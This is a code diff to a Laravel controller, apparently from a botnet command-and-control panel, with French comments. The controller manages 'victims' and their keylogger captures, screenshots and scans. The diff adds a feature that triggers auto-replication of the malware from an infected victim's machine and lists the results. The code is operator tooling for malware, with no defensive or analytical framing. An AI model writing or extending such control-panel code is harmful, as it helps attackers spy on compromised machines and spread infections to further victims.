@@ -87,6 +87,10 @@ class VictimsController extends Controller
             ->where('victim_attacks.type', 'keylogger')
             ->where('victim_attacks.state', 'done')
             ->get();
+        // Récupérer les autorep de la victime
+        $autoreps = VictimAttacks::where('victim_id', $victim->id)
+            ->where('victim_attacks.type', 'autorep')
+            ->get();
     
         return view('victims.show', [
             'username' => $username, 
@@ -97,7 +101,8 @@ class VictimsController extends Controller
             'pictures' => $pictures,
             'screenshots' => $screenshots,
             'scans' => $scans,
-            'keyloggers' => $keyloggers
+            'keyloggers' => $keyloggers,
+            'autoreps' => $autoreps
         ]);
     }
     
@@ -178,6 +183,16 @@ class VictimsController extends Controller
         $keylogger = (new BotnetController)->keylogger($victim_uid, $time);
 
         return redirect("/victims/$victim_id")->with('output', "Keylogger lancé sur la victime.");
+    }
+
+    public function autorep(Request $request)
+    {
+        $victim_id = $request->victim_id;
+        $victim_uid = $request->victim_uid;
+
+        $autorep = (new BotnetController)->autorep($victim_uid);
+
+        return redirect("/victims/$victim_id")->with('output', "Auto-replication lancé sur la victime.");
     }
 
     public function screenshot(Request $request)
